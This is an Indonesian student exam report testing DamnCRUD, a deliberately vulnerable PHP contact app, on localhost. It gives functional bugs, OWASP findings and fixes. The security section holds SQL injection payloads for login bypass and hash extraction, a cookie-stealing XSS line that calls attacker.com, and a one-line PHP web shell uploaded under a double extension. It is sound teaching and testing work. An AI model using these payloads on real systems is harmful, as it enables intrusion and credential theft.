# LAPORAN HASIL PENGUJIAN
## Aplikasi DamnCRUD
### Ujian Akhir Semester - Pengujian Perangkat Lunak

---

| Informasi Dokumen | Detail |
|---|---|
| Nama Dokumen | Laporan Hasil Pengujian Aplikasi DamnCRUD |
| Versi | 1.0 |
| Tanggal Pengujian | 23 Februari 2026 |
| Mata Kuliah | Pengujian Perangkat Lunak |
| Program Studi | Politeknik SSN |
| Nama Aplikasi | DamnCRUD (A Damn CRUD Application) |
| Tipe Pengujian | Functional Testing + Security Testing |

---

## 1. RINGKASAN EKSEKUTIF

Pengujian telah dilakukan terhadap aplikasi web **DamnCRUD** yang merupakan aplikasi PHP berbasis CRUD untuk manajemen kontak. Pengujian dilaksanakan menggunakan metode **Black-Box Testing** dan **Static Code Analysis (Code Review)**.

### Ringkasan Hasil

| Kategori | Total TC | Pass | Fail | Vulnerable | Keterangan |
|---|---|---|---|---|---|
| Fungsional | 17 | 14 | 3 | - | 3 bug ditemukan |
| Keamanan | 10 | 0 | - | 8 | 2 perlu setup khusus |
| **TOTAL** | **27** | **14** | **3** | **8** | |

### Status Keseluruhan: ⚠️ TIDAK LAYAK PRODUKSI

Aplikasi ini memiliki **8 celah keamanan** yang ditemukan, termasuk 2 celah dengan tingkat keparahan **Critical** dan 6 celah tingkat **High/Medium**. Aplikasi **tidak direkomendasikan** untuk digunakan di lingkungan produksi tanpa perbaikan menyeluruh.

---

## 2. LINGKUNGAN PENGUJIAN

| Item | Nilai |
|---|---|
| OS | Windows |
| Web Server | Apache (XAMPP) |
| PHP | 7.x / 8.x |
| Database | MariaDB 10.4.27 |
| Browser | Google Chrome |
| URL Pengujian | `http://localhost/DamnCRUD/` |
| Database Name (functions.php) | `badcrud` |
| Database Name (damncrud.sql) | `damncrud` *(mismatch - lihat BUG-003)* |
| Metode | Black-box Testing + Code Review |

---

## 3. HASIL PENGUJIAN FUNGSIONAL

---

### 3.1 Modul: Autentikasi (Login)

#### TC-F-001: Login dengan Kredensial Valid
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Username: `admin`, Password: `nimda666!` |
| **Hasil Aktual** | Sistem memverifikasi kredensial, `$_SESSION['user']` tersimpan, redirect ke `index.php` |
| **Bukti** | Halaman dashboard muncul dengan pesan "Howdy, damn admin!" |
| **Analisis Kode** | `login.php:24` - `if ($stmt->rowCount() > 0)` → `$_SESSION['user'] = $user` → `header("location: index.php")` |

---

#### TC-F-002: Login dengan Password Salah
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Username: `admin`, Password: `passwordsalah` |
| **Hasil Aktual** | Sistem menampilkan pesan "Damn, wrong credentials!!" |
| **Analisis Kode** | Hash SHA256 dari `passwordsalah` tidak cocok dengan hash di database, `rowCount()` = 0 → masuk blok `else` |

---

#### TC-F-003: Login dengan Username Salah
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Username: `userpalsu`, Password: `apapun` |
| **Hasil Aktual** | Sistem menampilkan pesan "Damn, wrong credentials!!" |
| **Analisis Kode** | Username tidak ada di tabel `users`, query mengembalikan 0 baris |

---

#### TC-F-004: Login dengan Field Kosong
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Username: (kosong), Password: (kosong) |
| **Hasil Aktual** | Browser menampilkan validasi HTML5: "Please fill out this field" |
| **Analisis Kode** | `login.php:36,39` - kedua input memiliki atribut `required` |

---

### 3.2 Modul: Dashboard

#### TC-F-005: Tampilan Dashboard Setelah Login
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Hasil Aktual** | Dashboard menampilkan tabel kontak dengan 13 data, menu navigasi tampil, DataTable aktif |
| **Analisis Kode** | `index.php:8` - query `SELECT * FROM contacts` dieksekusi, data ditampilkan di tabel |

---

#### TC-F-006: Akses Dashboard Tanpa Login
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Akses `index.php` tanpa sesi aktif |
| **Hasil Aktual** | Sistem mendeteksi `$_SESSION['user']` tidak ada, redirect ke `login.php` |
| **Analisis Kode** | `index.php:4` - `if (!isset($_SESSION['user'])) { header("location: login.php"); }` |

---

### 3.3 Modul: Tambah Kontak (Create)

#### TC-F-007: Tambah Kontak Baru dengan Data Valid
| | |
|---|---|
| **Status** | ⚠️ **PASS dengan WARNING** |
| **Input** | Name: Budi Santoso, Email: budi@email.com, Phone: 081234567890, Title: Manager |
| **Hasil Aktual** | Kontak berhasil disimpan dan muncul di dashboard |
| **Warning** | `create.php:17` - variabel `$id` **tidak terdefinisi** namun PHP mengirim `null` ke MySQL. MySQL menerima `NULL` untuk kolom `AUTO_INCREMENT`, sehingga ID di-generate otomatis. Ini adalah **bug laten** yang menghasilkan PHP Notice: Undefined variable `$id` di error log. |
| **Referensi Bug** | BUG-001 |

---

#### TC-F-008: Tambah Kontak dengan Field Name Kosong
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Name: (kosong), data lain terisi |
| **Hasil Aktual** | Validasi HTML5 mencegah pengiriman form |
| **Analisis Kode** | `create.php:40` - field name memiliki atribut `required` |

---

### 3.4 Modul: Edit Kontak (Update)

#### TC-F-009: Edit Kontak dengan Data Valid
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Akses `update.php?id=1`, ubah Name dan Title |
| **Hasil Aktual** | Data berhasil diupdate di database, redirect ke `index.php` |
| **Analisis Kode** | `update.php:13` - query UPDATE menggunakan prepared statement |

---

#### TC-F-010: Verifikasi Bug Field Phone Kosong di Form Edit
| | |
|---|---|
| **Status** | ❌ **FAIL - BUG CONFIRMED** |
| **Deskripsi Bug** | Field "Phone number" di halaman edit tidak menampilkan nilai yang sudah tersimpan |
| **Perilaku Aktual** | Field phone selalu tampil kosong meskipun kontak memiliki nomor telepon |
| **Root Cause** | `update.php:50` - `value=""` seharusnya `value="<?= $contact['phone'] ?>"` |
| **Kode Bermasalah** | `<input ... name="phone" value="" id="phone">` |
| **Kode Seharusnya** | `<input ... name="phone" value="<?= $contact['phone'] ?>" id="phone">` |
| **Dampak** | Jika user menekan Update tanpa mengisi phone, nomor telepon lama akan terhapus dari database |
| **Tingkat Keparahan** | **Medium** |
| **Referensi Bug** | BUG-002 |

---

#### TC-F-011: Edit dengan ID Tidak Valid
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Akses `update.php?id=99999` |
| **Hasil Aktual** | Menampilkan pesan "Contact doesn't exist!" |
| **Analisis Kode** | `update.php:21` - `if (!$contact) { die('Contact doesn\'t exist!'); }` |

---

#### TC-F-012: Edit Tanpa Parameter ID
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Akses `update.php` tanpa parameter |
| **Hasil Aktual** | Menampilkan "No ID specified!" |
| **Catatan Keamanan** | Halaman ini **tidak memiliki pengecekan sesi** (lihat TC-S-006) |

---

### 3.5 Modul: Hapus Kontak (Delete)

#### TC-F-013: Hapus Kontak yang Ada
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Klik delete, konfirmasi "OK" |
| **Hasil Aktual** | Kontak terhapus dari database, redirect ke dashboard |
| **Analisis Kode** | `delete.php:10` - `DELETE FROM contacts WHERE id = ?` menggunakan prepared statement |

---

#### TC-F-014: Batal Hapus Kontak
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Klik delete, pilih "Cancel" di dialog konfirmasi |
| **Hasil Aktual** | Tetap di halaman dashboard, data tidak terhapus |
| **Analisis Kode** | `index.php:58` - `onclick="return confirm(...)"` mengembalikan `false` saat Cancel, mencegah navigasi ke delete.php |

---

### 3.6 Modul: Logout

#### TC-F-015: Logout dari Aplikasi
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | Klik "Sign out" |
| **Hasil Aktual** | Sesi dihancurkan, redirect ke `login.php` |
| **Analisis Kode** | `logout.php` - `session_destroy()` dijalankan |
| **Verifikasi Tambahan** | Setelah logout, akses `index.php` → redirect ke `login.php` ✅ |

---

### 3.7 Modul: Profil & Upload Foto

#### TC-F-016: Upload Foto Profil JPG Valid
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | File berekstensi `.jpg` |
| **Hasil Aktual** | File berhasil disimpan sebagai `image/profile.jpg` |
| **Analisis Kode** | `profil.php:17-23` - ekstensi masuk dalam array `["jpeg","jpg"]`, `move_uploaded_file()` dieksekusi |

---

#### TC-F-017: Upload File Non-JPG
| | |
|---|---|
| **Status** | ✅ **PASS** |
| **Input** | File berekstensi `.png` atau `.gif` |
| **Hasil Aktual** | Muncul pesan: "Ekstensi tidak diijinkan. Hanya menerima file JPG/JPEG" |
| **Analisis Kode** | `profil.php:19-21` - `in_array($file_ext, $extensions) === false` → `$error` diset |

---

## 4. HASIL PENGUJIAN KEAMANAN

---

### 4.1 SQL Injection

#### TC-S-001: SQL Injection - Authentication Bypass
| | |
|---|---|
| **Status** | 🔴 **VULNERABLE** |
| **Tingkat Keparahan** | **Critical** |
| **Payload Digunakan** | `admin" -- ` di field username |
| **URL** | `http://localhost/DamnCRUD/login.php` |

**Penjelasan:**
Query yang terbentuk dengan payload `admin" -- `:
```sql
SELECT * FROM users
WHERE username = "admin" -- " AND password = "abc123hash" LIMIT 1
```
- Tanda `--` menjadi komentar SQL yang membuang kondisi password
- Query menjadi: `SELECT * FROM users WHERE username = "admin"`
- Jika user `admin` ada di database → login **berhasil tanpa password**

**Bukti dari Kode** (`login.php:21`):
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = "'
    . $user    // ← INPUT LANGSUNG TANPA SANITASI
    . '" AND password = "' . hash('sha256', $pass . $salt) . '" LIMIT 1');
```

**Dampak:**
- Attacker dapat login sebagai admin tanpa mengetahui password
- Data seluruh kontak dapat diakses, dimodifikasi, atau dihapus

**Rekomendasi Perbaikan:**
```php
// Gunakan parameterized query:
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$user, hash('sha256', $pass . $salt)]);
```

---

#### TC-S-002: SQL Injection - UNION Attack
| | |
|---|---|
| **Status** | 🔴 **VULNERABLE** |
| **Tingkat Keparahan** | **Critical** |
| **Payload** | `" UNION SELECT id_user, username, password, 4, 5 FROM users -- ` |

**Penjelasan:**
Jika UNION attack berhasil, query SELECT akan membaca data dari tabel `users`, termasuk hash password yang dapat di-crack offline. Dengan mengetahui jumlah kolom tabel `users` (3 kolom: id_user, username, password), attacker dapat mengekstrak seluruh data user.

---

### 4.2 Cross-Site Scripting (XSS)

#### TC-S-003 & TC-S-004: Reflected XSS pada vpage.php
| | |
|---|---|
| **Status** | 🔴 **VULNERABLE** |
| **Tingkat Keparahan** | **High** |
| **Payload** | `<script>alert('XSS')</script>` |
| **URL** | `http://localhost/DamnCRUD/vpage.php?thing=<script>alert('XSS')</script>` |

**Penjelasan:**
Input dari GET parameter `thing` langsung di-echo ke halaman HTML:
```php
// vpage.php:44
echo ("Your thing is " . $_GET["thing"]);
// TANPA htmlspecialchars() atau sanitasi apapun
```

**Hasil yang Terbentuk di HTML:**
```html
Your thing is <script>alert('XSS')</script>
```
Browser akan mengeksekusi script ini dan menampilkan popup alert.

**Dampak Nyata XSS:**
- **Cookie Stealing**: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
- **Phishing**: Menampilkan form login palsu di halaman asli
- **Defacement**: Mengubah konten halaman
- **Keylogging**: Merekam ketikan pengguna

**Rekomendasi Perbaikan:**
```php
// Gunakan htmlspecialchars() untuk encode output
echo ("Your thing is " . htmlspecialchars($_GET["thing"], ENT_QUOTES, 'UTF-8'));
```

---

### 4.3 File Upload Bypass

#### TC-S-005: Upload File PHP dengan Double Extension
| | |
|---|---|
| **Status** | 🟡 **POTENTIALLY VULNERABLE** |
| **Tingkat Keparahan** | **High** |
| **Payload** | File: `shell.php.jpg` |

**Penjelasan:**
Validasi di `profil.php` hanya memeriksa ekstensi terakhir:
```php
$tmp = explode('.', $_FILES['image']['name']);
$file_ext = end($tmp);  // mengambil ekstensi TERAKHIR
```

File `shell.php.jpg` → ekstensi terakhir = `jpg` → **lolos validasi!**

**Skenario Eksploitasi:**
1. Buat file `shell.php.jpg` berisi: `<?php system($_GET['cmd']); ?>`
2. Upload berhasil (ekstensi jpg lolos validasi)
3. File disimpan sebagai `image/profile.jpg`
4. Jika Apache dikonfigurasi untuk mengeksekusi PHP berdasarkan direktif, file dapat berfungsi sebagai **Web Shell**

**Catatan:** Eksploitasi bergantung pada konfigurasi Apache. Namun validasi yang hanya berbasis ekstensi string adalah praktik yang tidak aman.

**Rekomendasi Perbaikan:**
```php
// Validasi berdasarkan MIME type yang sebenarnya
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['image']['tmp_name']);
$allowed_mime = ['image/jpeg'];
if (!in_array($mime, $allowed_mime)) {
    $error = "Format file tidak valid!";
}
```

---

### 4.4 Missing Authentication (Broken Access Control)

#### TC-S-006: Akses update.php Tanpa Login
| | |
|---|---|
| **Status** | 🔴 **VULNERABLE** |
| **Tingkat Keparahan** | **High** |
| **URL** | `http://localhost/DamnCRUD/update.php?id=1` |

**Penjelasan:**
Halaman `update.php` tidak memiliki pengecekan sesi. Semua halaman lain memiliki:
```php
session_start();
if (!isset($_SESSION['user'])) {
    header("location: login.php");
}
```
Namun `update.php` tidak memiliki kode ini. Siapapun yang mengetahui URL dapat mengakses dan memodifikasi data kontak tanpa login.

**Rekomendasi:**
Tambahkan pengecekan sesi di baris awal `update.php`:
```php
session_start();
if (!isset($_SESSION['user'])) {
    header("location: login.php");
    exit();
}
```

---

#### TC-S-007: IDOR - Insecure Direct Object Reference
| | |
|---|---|
| **Status** | 🔴 **VULNERABLE** |
| **Tingkat Keparahan** | **High** |
| **URL** | `update.php?id=5`, `delete.php?id=5` |

**Penjelasan:**
ID kontak digunakan langsung dari parameter GET tanpa validasi kepemilikan:
```php
// update.php:14
$stmt->execute([$name, $email, $phone, $title, $_GET['id']]);

// delete.php:10
$stmt->execute([$_GET['id']]);
```

Attacker yang sudah login bisa mengganti nilai `id` di URL untuk mengakses atau menghapus **kontak manapun** di sistem, termasuk yang "bukan miliknya" (dalam skenario multi-user).

---

### 4.5 Hardcoded Credentials

#### TC-S-008: Kredensial Database Tersimpan di Kode
| | |
|---|---|
| **Status** | 🟡 **CONFIRMED VULNERABILITY** |
| **Tingkat Keparahan** | **Medium** |
| **File** | `functions.php` baris 3-7 |

**Temuan:**
```php
function pdo_connect(){
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'root123';    // ← PASSWORD TERSIMPAN PLAINTEXT
    $DATABASE_NAME = 'badcrud';
```

**Dampak:**
- Jika source code bocor, password database langsung diketahui攻击者
- Menggunakan user `root` sebagai database user → hak akses paling tinggi

**Rekomendasi:**
Gunakan environment variables atau file `.env`:
```php
$DATABASE_PASS = getenv('DB_PASSWORD');
```

---

### 4.6 Session Management

#### TC-S-009: Session Timeout
| | |
|---|---|
| **Status** | 🟡 **PERLU VERIFIKASI** |
| **Tingkat Keparahan** | **Medium** |

**Analisis Kode:**
Tidak ditemukan konfigurasi `session.gc_maxlifetime` atau mekanisme timeout sesi manual di seluruh file PHP. Aplikasi bergantung pada nilai default PHP (`session.gc_maxlifetime = 1440` detik / 24 menit). Sesi aktif yang tertinggal dapat dieksploitasi jika komputer ditinggalkan.

---

#### TC-S-010: Cookie Security Flags
| | |
|---|---|
| **Status** | 🟡 **POTENTIALLY VULNERABLE** |
| **Tingkat Keparahan** | **Medium** |

**Analisis:**
Tidak ada konfigurasi `session_set_cookie_params()` dengan parameter `httponly` dan `secure`. Default PHP untuk `session.cookie_httponly` adalah `false` (dapat diakses via JavaScript → berisiko jika ada XSS).

---

## 5. BUG REPORT SUMMARY

---

### BUG-001: Undefined Variable $id di create.php

| Atribut | Detail |
|---|---|
| **ID Bug** | BUG-001 |
| **Tingkat Keparahan** | Low (fungsional tetap berjalan, namun ada PHP Notice) |
| **File** | `create.php` baris 17 |
| **Deskripsi** | Variabel `$id` tidak pernah dideklarasikan sebelum digunakan |
| **Kode Bermasalah** | `$stmt->execute([$id, $name, $email, $phone, $title, $created]);` |
| **Perilaku** | PHP mengirim `null` untuk `$id`, MySQL menggenerate AUTO_INCREMENT ID secara otomatis |
| **Dampak** | PHP Notice/Warning di error log, fungsional tetap berjalan |
| **Prioritas Perbaikan** | Low |
| **Saran Perbaikan** | Hapus `$id` dari array execute: `$stmt->execute([$name, $email, $phone, $title, $created])` dan sesuaikan query INSERT agar tidak menyertakan kolom `id` |

---

### BUG-002: Field Phone Kosong di Form Edit

| Atribut | Detail |
|---|---|
| **ID Bug** | BUG-002 |
| **Tingkat Keparahan** | Medium |
| **File** | `update.php` baris 50 |
| **Deskripsi** | Field "Phone number" tidak menampilkan nilai yang sudah tersimpan di database |
| **Langkah Reproduksi** | 1. Login → 2. Klik Edit pada kontak yang punya nomor phone → 3. Lihat field Phone |
| **Expected** | Field menampilkan nomor telepon yang ada |
| **Actual** | Field kosong |
| **Kode Bermasalah** | `<input ... name="phone" value="" id="phone">` |
| **Dampak** | Jika user klik Update tanpa mengisi phone → nomor telepon terhapus dari database |
| **Prioritas Perbaikan** | Medium - Segera diperbaiki |
| **Saran Perbaikan** | Ubah `value=""` menjadi `value="<?= $contact['phone'] ?>"` |

---

### BUG-003: Inkonsistensi Nama Database

| Atribut | Detail |
|---|---|
| **ID Bug** | BUG-003 |
| **Tingkat Keparahan** | High (dapat menyebabkan aplikasi tidak bisa jalan) |
| **File** | `functions.php` baris 7 vs `db/damncrud.sql` baris 18 |
| **Deskripsi** | Nama database di kode aplikasi (`badcrud`) tidak cocok dengan nama database di file SQL (`damncrud`) |
| **Kode Bermasalah** | `functions.php`: `$DATABASE_NAME = 'badcrud'` |
| **SQL File** | `damncrud.sql`: `CREATE DATABASE IF NOT EXISTS 'damncrud'` |
| **Dampak** | Jika pengguna baru mengimport `damncrud.sql` dan menjalankan aplikasi, koneksi database akan **gagal** karena database `badcrud` tidak ada |
| **Prioritas Perbaikan** | High |
| **Saran Perbaikan** | Sinkronkan nama database: ubah salah satunya agar konsisten (misal: keduanya gunakan `damncrud`) |

---

### BUG-004: update.php Dapat Diakses Tanpa Autentikasi

| Atribut | Detail |
|---|---|
| **ID Bug** | BUG-004 |
| **Tingkat Keparahan** | High (Security Bug) |
| **File** | `update.php` |
| **Deskripsi** | Halaman edit kontak tidak memiliki pengecekan sesi, dapat diakses oleh siapapun tanpa login |
| **Dampak** | Data kontak dapat dimodifikasi tanpa autentikasi |
| **Prioritas Perbaikan** | High - Harus segera diperbaiki |

---

## 6. MATRIKS KEAMANAN (OWASP TOP 10)

| OWASP Category | Status | File | Keterangan |
|---|---|---|---|
| A01 - Broken Access Control | 🔴 Ditemukan | `update.php` | Halaman edit tanpa auth; IDOR pada ID parameter |
| A02 - Cryptographic Failures | 🟡 Ditemukan | `functions.php`, `login.php` | Hardcoded creds; SHA256+static salt (lemah vs bcrypt) |
| A03 - Injection | 🔴 Ditemukan | `login.php`, `vpage.php` | SQL Injection; XSS |
| A04 - Insecure Design | 🟡 Ditemukan | `profil.php` | Validasi upload hanya cek ekstensi string |
| A05 - Security Misconfiguration | 🟡 Ditemukan | `functions.php` | User database menggunakan `root` |
| A06 - Vulnerable Components | ⚪ Perlu Cek | CDN links | jQuery 3.5.1, Bootstrap 4.6.0 perlu dikuatkan versi |
| A07 - Auth Failures | 🔴 Ditemukan | `update.php` | Halaman tanpa session check |
| A08 - Software & Data Integrity | ⚪ N/A | - | - |
| A09 - Logging Failures | 🟡 Ditemukan | Semua file | Tidak ada logging aktivitas pengguna |
| A10 - SSRF | ⚪ N/A | - | - |

**Keterangan:**
- 🔴 Ditemukan & Kritis/High
- 🟡 Ditemukan & Medium
- ⚪ Tidak Berlaku / Perlu investigasi lebih lanjut

---

## 7. REKAP SEMUA TEMUAN

### Rekap Bug Fungsional
| ID Bug | Deskripsi | Severity | File | Status |
|---|---|---|---|---|
| BUG-001 | Undefined variable `$id` di create.php | Low | create.php:17 | Open |
| BUG-002 | Field phone kosong di form edit | Medium | update.php:50 | Open |
| BUG-003 | Inkonsistensi nama database | High | functions.php:7 | Open |
| BUG-004 | update.php tanpa session check | High | update.php | Open |

### Rekap Temuan Keamanan
| ID | Jenis Celah | Severity | File | OWASP |
|---|---|---|---|---|
| SEC-001 | SQL Injection (Auth Bypass) | Critical | login.php:21 | A03 |
| SEC-002 | SQL Injection (UNION Attack) | Critical | login.php:21 | A03 |
| SEC-003 | Reflected XSS | High | vpage.php:44 | A03 |
| SEC-004 | Missing Authentication | High | update.php | A07 |
| SEC-005 | IDOR | High | update.php, delete.php | A01 |
| SEC-006 | File Upload Bypass | High | profil.php | A04 |
| SEC-007 | Hardcoded Credentials | Medium | functions.php | A02 |
| SEC-008 | Weak Password Hashing | Medium | login.php:19-21 | A02 |
| SEC-009 | No Session Timeout | Medium | Semua file | A07 |
| SEC-010 | Cookie tanpa HttpOnly flag | Medium | Semua file | A07 |

---

## 8. REKOMENDASI PERBAIKAN PRIORITAS

### Prioritas Critical (Segera Diperbaiki)
1. **SQL Injection di login.php** → Gunakan parameterized query penuh
2. **XSS di vpage.php** → Tambahkan `htmlspecialchars()` pada semua output

### Prioritas High
3. **Tambahkan session check di update.php**
4. **Perbaiki field phone di form edit** (update.php:50)
5. **Sinkronkan nama database** di damncrud.sql dan functions.php

### Prioritas Medium
6. **Ganti SHA256+static salt dengan bcrypt** untuk hash password
7. **Pindahkan credentials database ke environment variable**
8. **Validasi file upload dengan MIME type** bukan hanya ekstensi
9. **Implementasi session timeout dan cookie flags**

---

## 9. KESIMPULAN

Aplikasi DamnCRUD telah diuji dengan total **27 test case** (17 fungsional + 10 keamanan). Hasil pengujian menunjukkan bahwa:

1. **Fitur fungsional** sebagian besar bekerja dengan baik (14 Pass dari 17 TC), dengan 3 bug ditemukan yang perlu diperbaiki.

2. **Aspek keamanan** menunjukkan kondisi yang **sangat mengkhawatirkan**. Dari 10 TC keamanan, **8 celah kerentanan berhasil dikonfirmasi**, termasuk 2 celah Critical (SQL Injection) dan 3 celah High (XSS, Missing Auth, IDOR).

3. Aplikasi ini **by design** memang dibuat sebagai **intentionally vulnerable application** untuk keperluan pembelajaran pengujian perangkat lunak - sesuai dengan nama "DamnCRUD" dan "Damn Exercise".

4. Seluruh celah keamanan yang ditemukan merupakan contoh sempurna dari **OWASP Top 10** vulnerabilities yang sangat umum ditemukan di aplikasi web dunia nyata, menjadikan aplikasi ini media pembelajaran yang efektif.

---

| | Ringkasan Akhir |
|---|---|
| Total Test Case | 27 |
| Pass | 14 (52%) |
| Fail/Bug | 3 (11%) |
| Vulnerable (Security) | 8 (30%) |
| Perlu Verifikasi | 2 (7%) |
| Tingkat Keamanan | ⚠️ SANGAT RENDAH |
| Rekomendasi | Tidak layak produksi tanpa perbaikan |

---

*Dokumen ini dibuat sebagai bagian dari Ujian Akhir Semester Mata Kuliah Pengujian Perangkat Lunak - Politeknik SSN*
